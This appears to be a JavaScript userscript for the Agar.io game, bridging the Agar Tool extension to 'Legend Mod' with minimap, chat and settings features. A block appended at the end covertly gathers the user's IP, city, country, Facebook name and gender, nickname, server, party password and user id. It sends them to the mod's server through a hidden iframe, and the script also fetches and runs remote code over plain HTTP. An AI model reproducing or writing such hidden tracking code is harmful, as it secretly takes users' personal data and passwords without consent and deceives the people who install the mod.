/*************
* Legend mod Project by Jimboy3100   email:jimboy3100@hotmail.com
* Universal Compatibility tools
* Semiversion 12h
*************/

//1.1
(function() {
    'use strict';
    var global = window.unsafeWindow || window;
    var my = {
        "name": "Agario Tool -> Legend Mod",
        "log": function(msg){ console.log(this.name + ":"+ msg); },
        "tool_symbol": "L.M"
    };
    var stat = {
        "AgarToolVersion": 5,
        "AgarToolServer": "wss://minimap.agartool.io:9000",
        minimapBalls: {},
        "socketIoURL": "https://legendmod.ml/ExampleScripts/socket-io.min.js",
        // ---- Legend Mod settings  -----
        "minimapNickFont": "700 11px Ubuntu",
        "minimapNickColor": "#ffffff",
        "minimapNickStrokeColor": "#000000",
        "minimapNickStrokeSize": 0x2,
        "minimapTop": 0x18,
        "minimapTeammatesSize": 5.5,
        //"minimapTeammatesColor": "#F03A17",
        //"minimapOffsetX": 0.5,
        //"minimapOffsetY": 0x18 + 9.5, // miniMapTop + 9.5
        "minimapOffsetX": 71,
		"chatColorNorm": "#FFFF00",
		"chatColorCommand": "#FF4400",
        // -----  for Legend Mod Ver.4  ----
        "mapSize": 14142, // ogario.mapSize,
        "mapOffset": 7071, // ogario.mapOffset,
        // -----  style  -----
		"darkThemeHudCss": {"color": "#C0C0C0"},
		"darkThemeControllerCss": {"color": "#E0E0E0"},
        "messageBoxCss": [{"bottom":"13px"},{"bottom": "40%"}],
		"chatTableSlimCss": [{"border-spacing":"0 8px"},{"border-spacing":"0 2px"}],
        // -----  other  -----
        "pi2": 0x2 * Math.PI,
        "keyCodeEnter": 13, // Enter
        "keyCodeA": 65, // 'A'
        "keyCodeR": 82, // 'R'
        "keyCodeS": 83, // 'S'
    };
    var cfg= {}, cfg_org = {
        "user_show": true,
        "minimap_show": true,
        "ogar_prefix": "L.M",
        "ogar_color": "#8C81C7",
        "update_interval": 1000,
        "tgar_prefix": "ⓐ",
        "tgar_user": true,
        "ogar_skinURL": "",
        "chat_close": false,
        "chat_unpause": true,
        "chat_vcenter": false,
        "chat_alt": true,
        "chat_ctrlalt": true,
        "chat_ctrl": true,
		"chat_slim": false,
		"chat_emoticon": true,
		"chat_image": true,
		"chat_video": false,
    };
    function pre_loop(){
        // At this point jQuery can not be used
        if(! document.getElementById("chatMessagesContainer")
				|| ! document.getElementById("settingsButton")
				|| ! global.AgarTool
				|| ! global.AgarTool.settings
				|| ! global.AgarTool.settings.checkboxes){
            my.pre_loop_timeout = (my.pre_loop_timeout || 1000) + 1000;
            setTimeout(pre_loop, my.pre_loop_timeout);
            my.log("wait for AgarTool load");
            return;
        }
        // Just to be sure, another 1 sec wait
        //setTimeout(initialize, 1000);
		loadScript("http://jimboy3100.github.io/ExampleScripts/libLM.user.js", initialize);
    }
    pre_loop();

    function initialize(){
		//$.extend(cfg, cfg_org, JSON.parse(GM_getValue("config", '{}')));
		$.extend(cfg, cfg_org, JSON.parse(my.storage_getValue("config",'{}')));
        global.at2o = {my:my, stat:stat, cfg:cfg};
        var local_style = '';
        local_style += '#at2o-hud {';
        local_style +=     ' font-size: 80%; pointer-events: auto;';
        local_style += '}';
        local_style += '#at2o-hud * {';
        local_style +=     ' user-select: auto!important;';
        local_style += '}';
        local_style += '#at2o-cfg-dlg {';
        //local_style +=     ' border-radius:0; font-size: 80%; padding: 2px 10px; position: fixed;';
        //local_style +=     ' pointer-events: auto; background-color: rgba(32,32,32,0.4); color: #ffffff;';
        //local_style +=     ' overflow: hidden;';
        local_style += '}';
        local_style += '#at2o-cfg-dlg * {';
        local_style +=     ' width: auto; user-select: auto!important; pointer-events: auto;';
		//local_style +=     ' position: relative; float: initial;';
		//local_style +=     ' display: run-in;'; // NG
		local_style += '}';
		local_style += '#at2o-cfg-dlg input {';
		//local_style +=     ' background-color: rgba(0,0,0,0.4); color: #ffffff;';
		local_style += '}';
		local_style += '.at2o-emoticon {';
		local_style +=     ' width: 1.25em; height: auto; vertical-align: middle;';
		local_style += '}';
		$("head").append('<style>\n'+ local_style +'\n</style>');
		$("#messageTempContainer").append(''+
			'<div id="at2o-hud">'+
				'<div id="at2o-top5" style="padding-left: 1em;"></div>'+
			'</div>');
		$("#connect").after(''+
			'<div id="at2o-controller">Universal:'+
			  '<span id="at2o-capture"><img src="https://legendmod.ml/banners/icon16.png" alt="icon16.png"></span>'+
			  '<span id="at2o-config">⚙</span>'+
			'</div>');
		try{
			if(global.AgarTool.settings.checkboxes.darkTheme){
				$("#at2o-hud").css(stat.darkThemeHudCss);
				//$("#at2o-controller").css(stat.darkThemeControllerCss);
			}
		}catch(e){}
		// Prevent mouse click from propagating
		$("#at2o-controller").mousedown(function(event){ return false;});
		$("#at2o-capture").click(function(event){
			my.log("capture_click");
			stat.capture = ! stat.capture;
			if(stat.capture){
				$("#at2o-capture").removeClass("disconnected").addClass("connected");
				$("#at2o-capture").text('🔙');
				my.capture_start();
			}else{
				$("#at2o-capture").removeClass("connected").addClass("disconnected");
				$("#at2o-capture").html('<img src="https://legendmod.ml/banners/icon16.png" alt="icon16.png">');
				my.capture_end();
			}
		});
		$("#at2o-config").click(my.config);
		my.config_apply();
		// --- Reconnect ---
		//$("#settingsButton").after(''+	// $("#connect").before
		$("#server").css("width", "100px"); //added
		$("#server").after(''+
			'<button id="at2o-reconnect" class="btn btn-primary"'+
			' style="float:left;">🎲</button>'+
			'').css('width', '50%');
        $("#at2o-reconnect").click(function(event){
			my.log("reconnect_click");
	        if(global.MC && global.MC.reconnect){
				global.MC.reconnect();
			}
		});
		// --- chat close ---
		if(cfg.chat_close){
			$("#message-menu").append('<a href="#" id="at2o-chat-close" style="float:right;">X</a>');
			$("#at2o-chat-close").click(function(){
				my.chatClose();
			});
		}
		//$("#enterChatMsg").keydown(function(event){
		stat.initialized = true;
		//let chatElem = $("#enterChatMsg").get(0);
		//chatElem.addEventListener('keydown', function(event){
		//Element.prototype.addEventListener.call(chatElem, 'keydown', function(event){
		//document.addEventListener('keydown', function(event){
		$(".emojionearea-button").before(''+
			'<div style="position: absolute;right: 30px;top:4px;">'+
				'<span id="at2o-chat-close" title="emergency close">✕</span>'+
				'&nbsp;'+
				'<span id="at2o-chat-send" title="Send to Legend Mod">L.M</span>'+
			'</div>');
		$("#at2o-chat-send").mousedown(function(event){
			my.chatSend({"clear": true});
		});
		$("#at2o-chat-close").mousedown(function(event){
			my.chatClose();
			return my.chatCancel(event);
		});
		// test
		//$(document).mousedown(function(ev){
		//	my.log("test mousedown");
		//	keyDownUp(stat.keyCodeS);
		//});
	}
	my.capture_start = function(){
		// If not, add chat submit button
		if($("#at2o-minimap").length){
			//$("#at2o-message").show(); // .prop('disabled', false);
			$("#at2o-minimap").show();
		}else{
			my.capture_init();
		}
		// Connection
		let tgar_prefix = (cfg.ogar_skinURL ? "" : cfg.tgar_prefix);
		var opt = {
			"tag": $('#tag').val(),
			"nick": tgar_prefix + $('#nick').val(),
			"serverToken": $('#server').val(),
			"skinURL": cfg.ogar_skinURL,
		};
		stat.ogar = global.lib_ogar.create(opt);
		stat.ogar.onchat = function(ev){
			//$('#chat').text(escapeHtml(ev.message));
			//my.log("chat:"+ ev.message);
			my.tgarChatAdd(ev);
		};
        stat.update_timerid = setInterval(my.update, cfg.update_interval);
    };
    my.capture_end = function(){
        //$("#at2o-message").hide(); // .prop('disabled', true);
        $('#at2o-top5').html('');
        $("#at2o-minimap").hide();
		stat.ogar.disconnect();
		stat.ogar = null;
        clearInterval(stat.update_timerid);
        stat.update_timerid = null;
    };
    my.capture_init = function(){
        //$("#message-menu").append('<a href="#" id="at2o-message" style="float:right;">'+ my.tool_symbol +'</a>');
        //$("#at2o-message").click(my.chatSend);
        // minimap
        var minimap = $("#minimap");
        var minimapWidth = minimap.attr('width');
        var minimapHeight = minimap.attr('height');
		minimap.before('<canvas id="at2o-minimap"'+
			' style="position: absolute;bottom: 0px;right: 0px;"'+
			' width="'+ minimapWidth +'" height="'+ minimapHeight +'">');
        //stat.minimapOffsetX = stat.minimapOffsetY + minimapHeight - minimapWidth;
    };
    my.update = function(){
        var tgarAlive = my.tgarIsAlive();
        if(tgarAlive != stat.alive){
            my.ogarAlive(tgarAlive);
        }
        if(stat.alive){
            my.ogarReposition();
        }
        my.tgarMinimapUpdate();
    };

    // -----  Configuration  -----
    my.config = function(){
        my.log("config_click2");
        if(!($('#at2o-cfg-start').length)){
            my.config_init();
        }
        my.cfg_load(cfg);
        //$("#at2o-cfg-dlg").show();
        //$("#overlays").show();
    };
    my.config_init = function(){
        //$("#overlays").append('<div id="at2o-cfg-dlg"'+
        $("#at2o-controller").after(''+
			'<hr id="at2o-cfg-start" />'+ my.name+ '<br/>'+
			''+
            '&nbsp;&nbsp;&nbsp;Update frequency [milliseconds]:<input type="text" data-at2o-config="update_interval" style="width:6em;"/>'+
            '<br/>Legend Mod Obtained from'+
            '<br/>&nbsp;<label><input type="checkbox" data-at2o-config="user_show"/>user list</label>'+
            '<br/>&nbsp;<label><input type="checkbox" data-at2o-config="minimap_show"/>minimap</label>'+
              '&nbsp;Prefix:<input type="text" data-at2o-config="ogar_prefix" style="width:4em;"/>'+
              '&nbsp;&nbsp;color:<input type="text" data-at2o-config="ogar_color" style="width:6em;"/>'+
            //    '<span class="input-group-addon"><i id="tgar_color" style="background-color: rgb(0, 0, 0);"></i></span>'+
            '<br/>Sent to Legend Mod'+
            '<br/>&nbsp;<label><input type="checkbox" data-at2o-config="tgar_user"/>user info</label>'+
              '&nbsp;Prefix:<input type="text" data-at2o-config="tgar_prefix" style="width:4em;"/>'+
              '<br/>&nbsp;skin:<input type="text" data-at2o-config="ogar_skinURL" style="width:20em;"/>'+
            '<br/>Chat option'+
              '<br/>&nbsp;<label><input type="checkbox" data-at2o-config="chat_close"/>close</label>'+
                '&nbsp;<label><input type="checkbox" data-at2o-config="chat_unpause"/>unpause</label>'+
                '&nbsp;<label><input type="checkbox" data-at2o-config="chat_vcenter"/>vcenter</label>'+
                '&nbsp;<label><input type="checkbox" data-at2o-config="chat_slim"/>slim</label>'+
              '<br/>&nbsp;<label><input type="checkbox" data-at2o-config="chat_emoticon"/>emoticon</label>'+
                '&nbsp;<label><input type="checkbox" data-at2o-config="chat_image"/>image</label>'+
                '&nbsp;<label><input type="checkbox" data-at2o-config="chat_video"/>video</label>'+
			  '<br/>&nbsp;<label><input type="checkbox" data-at2o-config="chat_alt"/>Alt→T</label>'+
                '&nbsp;<label><input type="checkbox" data-at2o-config="chat_ctrlalt"/>Ctrl+Alt→O+T</label>'+
                '&nbsp;<label><input type="checkbox" data-at2o-config="chat_ctrl"/>Ctrl→Close</label>'+
            '<br/>&nbsp;&nbsp;* Changes will be reflected after restart'+
			''+
			'<br/>'+
              '&nbsp;<span id="at2o-cfg-default" class="btn btn-primary">DEFAULT</span>'+
              '&nbsp;<span id="at2o-cfg-ok" class="btn btn-success">OK</span>'+
              '&nbsp;<span id="at2o-cfg-cancel" class="btn btn-danger">CANCEL</span>'+
			''+
		    '<hr id="at2o-cfg-end" />');
		//$("#at2o-cfg-dlg").mousedown(function(event){ return false;});
        $("#at2o-cfg-default").click(function(){
            my.cfg_load(cfg_org);
        });
        $("#at2o-cfg-ok").click(function(){
			cfg = my.cfg_save();
			//GM_setValue("config", JSON.stringify(cfg));
			my.storage_setValue("config", JSON.stringify(cfg));
			my.config_cancel();
			my.config_apply();
		});
		$("#at2o-cfg-cancel").click(function(){
			my.config_cancel();
		});
		my.config_cancel = function(){
			//$("#overlays").hide();
			//$("#at2o-cfg-dlg").hide();
			let elem = $("#at2o-cfg-start").get(0);
			let elemParent = elem.parentNode;
			let delList = [elem];
			for(;;){
				elem = elem.nextSibling;
				if(!elem){
					return;
				}
				delList.push(elem);
				if(elem.id == "at2o-cfg-end"){
					delList.forEach(function(elemDel){
						elemParent.removeChild(elemDel);
					});
					return;
				}
			}
		};
		//$("#tgar_color").colorpicker({'format': 'hex'}).on('changeColor.colorpicker', function(event){
		//    var id = event.target.id;
		//    $('[data-at2o-config="'+ id +'"]').val(event.color.toHex());
		//    event.target.style.backgroundColor = event.color.toRGB();
		//});
	};
	my.config_apply = function(){
		$(".enterChatMsg").css(stat.messageBoxCss[cfg.chat_vcenter ? 1: 0]);
		$("#messageTableComplete, #messageTableTemp")
			.css(stat.chatTableSlimCss[cfg.chat_slim ? 1 : 0]);
		if(cfg.chat_slim){
			my.chatObserver_start();
		}else{
			my.chatObserver_stop();
		}
	};

    // -----  chat  -----
	my.document_keydown = function(event){
		if(! stat.initialized){
			return false;
		}
		var modify = (event.altKey ? "a" : "")+
			(event.ctrlKey ? "c" : "")+
			(event.metaKey ? "m" : "")+
			(event.shiftKey ? "s" : "");
		//my.log("keydown which="+ event.which +", modify="+ modify);
		if(event.which != stat.keyCodeEnter || !global.writeChatMessage){
			return;
		}
		if(event.keyCode === stat.keyCodeEnter){
			if(modify === "a" && cfg.chat_alt){
				my.chatSend();
				return my.chatCancel(event);
			}else if(modify === "ac" && cfg.chat_ctrlalt){
				//my.chatSend({"tgar":true});
				//return false;
				my.chatSend({"noClose": true});
				return;
			}else if(modify === "c" && cfg.chat_ctrl){
				my.chatClose();
				return my.chatCancel(event);
			}
		}
		return; // Pass the processing to another handler
	};
	document.addEventListener('keydown', my.document_keydown, true);
	my.chatSend = function(flg_){
		var flg = flg_ || {};
		if(! my.isConnected){
			//global.toastr.error("A.T->L.M: not connected");
			return;
		}
		//var msg = $("#enterChatMsg").val();
		var msg = global.emojiHandler[0].emojioneArea.getText();
		if(msg.length){
//			stat.ogar.chatSend(msg);
			stat.ogar.chatSend('[Legend Mod/Agar tool]'+msg);			
			//if(flg.tgar){
			//	keyDownUp(stat.keyCodeEnter);
			//}else{
			//$("#enterChatMsg").hide();
			//}
			if(flg.clear){
				global.emojiHandler[0].emojioneArea.setText("");
			}
		}
		if(! flg.noClose){
			$("#chatInputHolder").hide();
		}
	};
	my.chatClose = function(){
		//$("#enterChatMsg").css("display", "none");
		$("#chatInputHolder").hide();
		if(cfg.chat_unpause && global.AgarTool.stopMovement){ // Release during PAUSE
			//keyDownUp(stat.keyCodeS);
			global.AgarTool.stopMovement = false;
		}
	};
	my.chatCancel = function(event){
		global.emojiHandler[0].emojioneArea.setText("");
		event.preventDefault();
		event.stopPropagation(); // Unknown why this is necessary
		return false;
	};
	my.chatObserver_start = function(){
		if(stat.obs_chat){
			return;
		}
		stat.obs_chat = new MutationObserver((mutations) => {
			my.log("hist changed");
			mutations.forEach((mutation) => {
				for(let node of mutation.addedNodes){
					$(node).css('height', '');
				}
				//$(mutation.target).children("tr").css('height', '');
			});
		});
		$("#messageTableComplete, #messageTableTemp")
			.each(function(){
			var table = this;
			stat.obs_chat.observe(table, {"childList": true});
			do_observe();
			function do_observe(){
				if(table.tBodies.length == 0){	// Uninitialized
					setTimeout(do_observe, 5000);
				}else{
					let tbody = table.tBodies[0];
					stat.obs_chat.observe(tbody, {"childList": true});
					$(tbody).children("tr").css('height', '');
				}
			}
		});
	};
	my.chatObserver_stop = function(){
		if(stat.obs_chat){
			stat.obs_chat.disconnect();
			delete stat.obs_chat;
		}
	};
	my.chatParse_imgRe = /\[img\](https?:\/\/i\.(?:imgur|hizliresim)\.com\/\w{6,8}\.(?:jpg|jpeg|png|gif)\??\d*)\[\/img\]/i;
	my.chatParse_videoRe = /\[yt\]([\w-]{11})\[\/yt\]/i;
	my.chatParse_emoticon = {
		':)': "smile.svg",
		';)': "wink.svg",
		'=)': "smirk.svg",
		':D': "grin.svg",
		'X-D': "xgrin.svg",
		'=D': "joy.svg",
		':(': "sad.svg",
		';(': "cry.svg",
		':P': "tongue.svg",
		';P': "tonguew.svg",
		':*': "kiss.svg",
		'$)': 'smileh.svg',
		'<3': "heart.svg",
		'8=)': "cool.svg",
		':o': "astonished.svg",
		'(:|': "sweat.svg",
		':|': "neutral.svg",
		':\\': "unamused.svg",
		':@': "pouting.svg",
		'|-)': "sleep.svg",
		'^_^': "relaxed.svg",
		'-_-': 'expressionless.svg',
		'$_$': "money.svg",
		'O:)': "angel.svg",
		'3:)': 'devil.svg',
		'(poop)': 'poo.svg',
		'(fuck)': "finger.svg",
		'(clap)': 'clap.svg',
		'(ok)': "ok.svg",
		'(victory)': 'victory.svg',
		'(y)': "thumb.svg",
		'(n)': 'thumbd.svg'
	};
	my.chatParse = function(msg){
		var imgRs = my.chatParse_imgRe.exec(msg);
		if(imgRs){
			if(cfg.chat_image){
				return '<img src="' + imgRs[1] + '" style="width:100%;border:none;">';
			}else{
				return "[IMG]";
			}
		}
		var videoRs = my.chatParse_videoRe.exec(msg);
		if(videoRs){
			if(cfg.chat_video){
				return '<iframe type="text/html" width="100%" height="auto" src="http://www.youtube.com/embed/'+
					videoRs[1] + '?autoplay=1&amp;vq=tiny" frameborder="0" />';
			}else{
				return "[VIDEO]";
			}
		}
		msg = escapeHtml(msg);
		if(cfg.chat_emoticon){
			msg = msg.replace(/\&lt\;3/g, '<3')
				.replace(/(O\:\)|3\:\)|8\=\)|\:\)|\;\)|\=\)|\:D|X\-D|\=D|\:\(|\;\(|\:P|\;P|\:\*|\$\)|\<3|\:o|\(\:\||\:\||\:\\|\:\@|\|\-\)|\^\_\^|\-\_\-|\$\_\$|\(poop\)|\(fuck\)|\(clap\)|\(ok\)|\(victory\)|\(y\)|\(n\))/g,
					function(match) {
						return '<img src="http://cdn.ogario.ovh/static/emoticons/' + my.chatParse_emoticon[match] + '" alt="' + match + '" class="at2o-emoticon">';
			});
		}
		return msg;
	};

	// =====  Legend Mod communication processing / connection  =====
	my.isConnected = function(){
		return	stat.ogar && stat.ogar.isConnected();
	};
	// =====  Agar Tool communication processing / processing  =====
	my.ogarAlive = function(alive){
		stat.alive = alive;
		if(cfg.tgar_user){
			//my.log("alive -> "+ stat.alive +" name="+ cfg.ogar_prefix + stat.nick);
			if(stat.alive){
			//	stat.alive = my.sendMinimapServerCommand({
			//		name: "alive",
			//		playerName: cfg.ogar_prefix + stat.nick
			//	});
			//	//my.log("alive >>"+ stat.alive);
			}else{
			//	my.sendMinimapServerCommand({
			//		name: "dead"
			//	});
				stat.ogar.sendPlayerPosition(0, 0, 0);
			}
		}
	};
	my.ogarReposition = function(){
		stat.ogar.sendPlayerPosition(AgarTool.realPlayerX, AgarTool.realPlayerY, 1);
	};

    // =====  Legend Mod Processing  ======
    my.tgarChatAdd = function(ev){
		stat.chatIdx = (stat.chatIdx ? stat.chatIdx + 1 : 1);
		let chatID = "at2o-chat-"+ stat.chatIdx;
		let chatBorderColor = (ev.isCommand ? stat.chatColorCommand : stat.chatColorNorm);
		let trStyle = 'color:#FFF;background-color:rgba(0,0,0,0.4);';
		if(! cfg.chat_slim){
			trStyle = 'height:40px;'+ trStyle;
		}
		
		if (ev.message.includes("Welcome! You are connected to the OGARio")){
		if ($("#at2o-controller").hasClass("OnceUsed")==false){
		ev.message="[SERVER]: Agar Tool and Legend Mod connected. Use L.M button on chat box to send to Legend Mod";
		$("#at2o-controller").addClass("OnceUsed");
		}
		else{
		ev.message="Applying changes to communication...";	
		}
		}
//		ev.message='[Legend Mod/Agar tools]'+ev.message;
		let msg = my.chatParse(ev.message);
		let htmlTd = '<td style="padding-left:8px;padding-right:8px">'
			+ '<b><span class="playerNameInMsg">' + escapeHtml(ev.nick)
			+ '</span></b></td>'
			+ '<td style="border-left: solid '+ chatBorderColor
				+';padding-left: 8px;padding-right:8px;'
				+'vertical-align:middle;width:260px;max-width:260px;'
				+'word-wrap: break-word;">'
				+ msg + '</td>';
		let htmlTmp = '<tr id="' + chatID + '" style="'+ trStyle +'">'
			+ htmlTd +'</tr>';
		let htmlCmp = '<tr style="'+ trStyle +'">'
			+ htmlTd +'</tr>';
		$("#messageTableTemp").append(htmlTmp);
		$("#messageTableComplete").append(htmlCmp);
		var scrollTop = $("#messageCompleteContainer")[0].scrollHeight
			- $("#messageCompleteContainer").height();
		$("#messageCompleteContainer")[0].scrollTop = scrollTop;
		$("#messageCompleteContainer").perfectScrollbar("update");
		setTimeout(function(){
			$("#" + chatID).fadeOut(100, function(){
				$("#" + chatID).remove();
			});
		}, 5e3);
    };
    my.tgarMinimapUpdate = function(){
		let ogar = stat.ogar;
		if(! ogar){
			return;
		}
		var minimap_elem = document.getElementById("at2o-minimap");
		var minimapWidth = minimap_elem.width;
		var minimapHeight = minimap_elem.height;
		var minimapMulti = (minimapWidth - 0x12) / my.ogarGetMapSize();
		var mapOffset = my.ogarGetMapOffset();
		//var mapOffsetX = ogario.mapOffset - ogario.mapOffsetX;
		//var mapOffsetY = ogario.mapOffset - ogario.mapOffsetY;
		stat.minimapOffsetX = 0x12 / 2;
		stat.minimapOffsetY = stat.minimapOffsetX + (minimapHeight - minimapWidth);
		var mapOffsetX = stat.minimapOffsetX;
		var mapOffsetY = stat.minimapOffsetY;
		var mapOffsetT = -(0x2 * stat.minimapTeammatesSize + 2);
		var ctx = minimap_elem.getContext('2d');
		ctx.clearRect(0, 0, minimapWidth, minimapHeight);
		ctx.font = stat.minimapNickFont;
		var user_txt = '';
		var sep = '';
		var timeLate = Date.now() - 0x7d0;
		//let players = ogar.teamPlayers.concat()
		//	.filter(function(x){
		//		return x.alive && x.updateTime > timeLate && x.mass > 0;
		//	}).sort(function(x, y){return y.mass - x.mass;});
		let players = ogar.getPlayerList();
		if(players.length === 0){
			user_txt = "no tgar user";
		}
		for(let player; (player = players.shift()); ){
			user_txt += sep + player.mass +" "+ escapeHtml(player.nick);
			sep = '<br/>';
			if(cfg.minimap_show){
				var name = cfg.ogar_prefix + player.nick;
				var mapX = (player.x + mapOffset) * minimapMulti + mapOffsetX;
				var mapY = (player.y + mapOffset) * minimapMulti + mapOffsetY;
				ctx.textAlign = 'center';
				ctx.lineWidth = stat.minimapNickStrokeSize;
				ctx.strokeStyle = stat.minimapNickStrokeColor;
				ctx.strokeText(name, mapX, mapY + mapOffsetT);
				ctx.fillStyle = cfg.tgar_color; // stat.minimapNickColor
				ctx.fillText(name, mapX, mapY + mapOffsetT);
				ctx.beginPath();
				ctx.arc(mapX, mapY, stat.minimapTeammatesSize, 0x0, stat.pi2, !0x1);
				ctx.closePath();
				ctx.fillStyle = player.color;
				ctx.fill();
			}
		}
		if(cfg.user_show){
			$('#at2o-top5').html(user_txt);
		}
	};
	// --- for Agar Tool ----
	my.tgarIsAlive = function(){
		return global.AgarTool ? global.AgarTool.isAlive : false;
	};
	my.ogarGetMapSize = function(){
		return global.ogario ? global.ogario.mapSize : stat.mapSize;
	};
	my.ogarGetMapOffset = function(){
		return global.ogario ? global.ogario.mapOffset : stat.mapOffset;
	};

	// =====  Other processing ======
	my.cfg_save = function(){
		var cfg_new = {};
		$('[data-at2o-config]').each(function(){
			var elem = $(this);
			var type = elem.prop('type');
			var name = elem.attr('data-at2o-config');
			var value;
			if(type === "checkbox"){
				value = elem.prop('checked');
			}else{
				value = $(this).val();
			}
			cfg_new[name] = value;
		});
		return cfg_new;
	};
	my.cfg_load = function(cfg_new){
		$('[data-at2o-config]').each(function(){
			var elem = $(this);
			var type = elem.prop('type');
			var name = elem.attr('data-at2o-config');
			if(cfg_new.hasOwnProperty(name)){
				var value = cfg_new[name];
				if(type === "checkbox"){
					elem.prop('checked', value);
				}else{
					$(this).val(value);
				}
			}
		});
	};
	my.storage_getValue = function(name, defval_){
		return	global.localStorage[my.name +"_"+ name] || defval_;
	};
	my.storage_setValue = function(name, value){
		global.localStorage[my.name +"_"+ name] = value;
	};

	function keyDownUp(keyCode){
		$(document).trigger(jQuery.Event('keydown',{ "keyCode": keyCode, "which": keyCode } ));
		$(document).trigger(jQuery.Event('keyup',{ "keyCode": keyCode, "which": keyCode } ));
		//$(document).trigger('keydown',{"keyCode":keyCode, "which":keyCode});
		//$(document).trigger('keyup',{"keyCode":keyCode, "which":keyCode});
	}
	function loadScript(url, callback){
		var script = document.createElement("script");
		script.type = "text/javascript";
		script.src = url;
		if(typeof callback !== 'undefined'){
			script.onload = callback;
		}
		document.head.appendChild(script);
	}
	function escapeHtml(e) {
		return e.replace(/&/g, "&amp;")
			.replace(/</g, "&lt;")
			.replace(/>/g, "&gt;")
			.replace(/"/g, "&quot;")
			.replace(/'/g, "&#039;");
	}
})();

setTimeout(function() {
var messageone;
if (messageone!="0"||messageone!="1"){
var detailed1;
userData = {};
userData = JSON.parse(localStorage.getItem("userData"));
var userip="0.0.0.0:0";
var usercity="NotFound";
var usercountry="NotFound";
var userfirstname = localStorage.getItem("userfirstname");
var userlastname = localStorage.getItem("userlastname");
var usergender = localStorage.getItem("usergender");
var fbresponse={};

function doDOMonloadevents2(){
		userData=$.get("http://gd.geobytes.com/GetCityDetails", function (response) { $("#response").html(JSON.stringify(response, null, 4)); }, "jsonp");
		setTimeout(function (){
		if (userData!=null) {localStorage.setItem("userData", JSON.stringify(userData));}
		},300);
		//Save Name, Surname, Gender
		FB.api('/me', {fields: 'first_name, last_name, gender'}, function(response) {fbresponse=response; return fbresponse;});
		setTimeout(function (){
			userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
			userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
			usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
			},250);
}

		$('*[data-itr="page_play"]').click(function() {

	if (userData.responseJSON.geobytesipaddress!= undefined) {
	userip=userData.responseJSON.geobytesipaddress;
	userip = userip.replace(" ", "_");
	}
	if (userData.responseJSON.geobytescity!= undefined) {
	usercity=userData.responseJSON.geobytescity;
	usercity = usercity.replace(" ", "_");
	}
	if (userData.responseJSON.geobytescountry!= undefined) {
	usercountry=userData.responseJSON.geobytescountry;
	usercountry = usercountry.replace(" ", "_");
	}

			var userid=$('#user-id-tag').text();userid = userid.replace("User id: ", "");
			var Pwdtosend="NONE";
			var servertosend="NotFound";
			var nicknametosend="NotFound";
			var userfirstname = localStorage.getItem("userfirstname");
			var userlastname = localStorage.getItem("userlastname");
			var modetosend="NotFound";
			var regiontosend="NotFound";

			if ($('#server').val() != ""&& $('#server').val() != null&& $('#server').val() != undefined) {servertosend=$('#server').val(); }
			if ($('#tag').val() != ""&& $('#tag').val() != undefined) {Pwdtosend=$('#tag').val(); }
			var i = 0, Pwdtosendlength = Pwdtosend.length;
			for(i; i < Pwdtosend ; i++) {
				Pwdtosend = Pwdtosend.replace(" ", "_");
				}
			if ($('#nick').val() != undefined) {nicknametosend=$('#nick').val(); }
			var i = 0, nicknametosendlength = nicknametosend.length;
			for(i; i < nicknametosendlength ; i++) {
				nicknametosend = nicknametosend.replace(" ", "_");
				}
			if ($('#server').val()!= undefined ) {
				if (servertosend.indexOf("#")==false) {
					servertosend= $('#server').val().replace('#', 'Party-');}}



			detailed1="https://legendmod.ml/AN?" + "name=" + nicknametosend + "&AgarTool=Play" + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&usrid=" + userid + "&type=NoLocked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&lastname=" + userlastname + "&firstname=" + userfirstname;

		$('#resetCheckboxes').append('<div id="loaderIframeInfo1"><iframe id="loaderIframeInfo" src = ' + detailed1 + ' name="detailedinfo" allowtransparency="true" scrolling="no" frameBorder="0" style="width:0%; height:0%; border:none;"></iframe></div>');
        $('#loaderIframeInfo1').hide();
		setTimeout(function() {
                                    $('#loaderIframeInfo1').remove();
                                }, 4000);
		});
}
var stylesLegendModConsole1 = [
    'background: linear-gradient(#D33106, #571402)'
    , 'border: 1px solid #3E0E02'
    , 'color: #99c2ff'
    , 'display: block'
    , 'text-shadow: 0 1px 0 rgba(0, 0, 0, 0.3)'
    , 'box-shadow: 0 1px 0 rgba(255, 255, 255, 0.4) inset, 0 5px 3px -5px rgba(0, 0, 0, 0.5), 0 -13px 5px -10px rgba(255, 255, 255, 0.4) inset'
    , 'line-height: 40px'
    , 'text-align: center'
    , 'font-weight: bold'
].join(';');
var stylesLegendModConsole2 = [
    'background: linear-gradient(grey, black)'
    , 'border: 1px solid #3E0E02'
    , 'color: #FFFFFF'
    , 'display: block'
    , 'text-shadow: 0 1px 0 rgba(0, 0, 0, 0.3)'
    , 'box-shadow: 0 1px 0 rgba(255, 255, 255, 0.4) inset, 0 5px 3px -5px rgba(0, 0, 0, 0.5), 0 -13px 5px -10px rgba(255, 255, 255, 0.4) inset'
//    , 'line-height: 40px'
    , 'text-align: center'
//    , 'font-weight: bold'
].join(';');	
console.group('%cAgar Tool⇒Legend Mod%c  %chttp://www.legendmod.ml',stylesLegendModConsole1, 'font-size: 48px; background: url(https://legendmod.ml/banners/icon48.png) no-repeat' , stylesLegendModConsole1);
    console.group("Part of");    		
		console.log('%cThe Legend mod Project™', stylesLegendModConsole2);
    console.groupEnd();
    console.group("Mod developed by"); 
		console.log('%c℄🌀Jimboy3100', stylesLegendModConsole2);
    console.groupEnd();
	console.groupEnd();
console.groupEnd();		
}, 8000);
setTimeout(function() {
MC.onConnect2 = MC.onConnect;
MC.onConnect = joint([ MC.onConnect2, Universalchatfix ]);		
$('#tag').blur(function() {
			Universalchatfix();
        });
}, 1500);
function Universalchatfix(){	
if ($("#at2o-capture").hasClass("connected")){
	$("#at2o-capture").click();
	
	$("#at2o-capture").click();
}}
function joint(a){var b;return b=a[a.length-1],a.pop(),a=a.length>1?joint(a):a[0],function(){b.apply(new a)}};
